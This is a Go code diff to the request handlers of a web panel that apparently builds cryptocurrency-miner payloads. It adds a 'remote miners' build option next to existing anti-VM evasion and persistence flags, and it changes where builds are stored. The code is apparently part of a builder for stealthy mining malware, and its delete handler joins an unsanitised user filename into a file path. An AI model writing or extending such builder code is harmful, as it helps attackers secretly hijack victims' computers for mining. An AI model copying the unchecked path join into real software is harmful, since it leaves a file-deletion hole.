@@ -18,6 +18,7 @@ type BuildRequest struct {
 	DebugConsole      bool   `json:"debug_console"`
 	AntiVM            bool   `json:"anti_vm"`
 	Persistence       bool   `json:"persistence"`
+	RemoteMiners      bool   `json:"remote_miners"`
 }
 
 // BuildMiner handles the build request by calling the builder with arguments
@@ -55,9 +56,9 @@ func (h *Handler) BuildMiner(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Create output directory in static/builds
+	// Create output directory in static/builds using base directory
 	buildID := fmt.Sprintf("%d", time.Now().Unix())
-	outputDir := filepath.Join("static", "builds")
+	outputDir := filepath.Join(h.baseDir, "static", "builds")
 	if err := os.MkdirAll(outputDir, 0755); err != nil {
 		log.Printf("Error creating output directory: %v", err)
 		http.Error(w, "Error creating output directory", http.StatusInternalServerError)
@@ -89,6 +90,9 @@ func (h *Handler) BuildMiner(w http.ResponseWriter, r *http.Request) {
 	}
 	if buildReq.Persistence {
 		args = append(args, "-persistence")
+	}
+	if buildReq.RemoteMiners {
+		args = append(args, "-remote-miners")
 	}
 
 	// Execute the builder from the parent directory so it can access Client/
@@ -165,7 +169,7 @@ func (h *Handler) ListBuilds(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	buildsDir := filepath.Join("static", "builds")
+	buildsDir := filepath.Join(h.baseDir, "static", "builds")
 	if err := os.MkdirAll(buildsDir, 0755); err != nil {
 		log.Printf("Error creating builds directory: %v", err)
 		http.Error(w, "Error accessing builds directory", http.StatusInternalServerError)
@@ -228,7 +232,7 @@ func (h *Handler) DeleteBuild(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	buildPath := filepath.Join("static", "builds", req.Filename)
+	buildPath := filepath.Join(h.baseDir, "static", "builds", req.Filename)
 
 	// Verify file exists
 	if _, err := os.Stat(buildPath); os.IsNotExist(err) {
